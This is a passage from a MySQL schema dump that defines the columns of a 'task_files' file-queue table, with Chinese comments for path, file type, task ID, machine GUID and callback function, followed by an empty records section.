  `tf_size` int(11) DEFAULT NULL COMMENT '文件尺寸',
  `tf_oldpath` varchar(255) DEFAULT NULL COMMENT '原路径',
  `tf_filetype` varchar(50) DEFAULT NULL COMMENT '文件类型',
  `tl_id` int(11) DEFAULT NULL COMMENT '队列ID',
  `tl_type` varchar(50) DEFAULT NULL COMMENT '队列类型',
  `tl_taskid` int(11) DEFAULT NULL COMMENT '任务ID',
  `tl_netbot` varchar(50) DEFAULT NULL COMMENT '机器GUID',
  `tf_stauts` int(2) DEFAULT '0' COMMENT '通知状态',
  `tl_backfun` varchar(50) DEFAULT NULL COMMENT '回调函数',
  `username` varchar(50) DEFAULT NULL COMMENT '用户名',
  PRIMARY KEY (`tf_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='文件队列';

-- ----------------------------
-- Records of task_files
-- ----------------------------
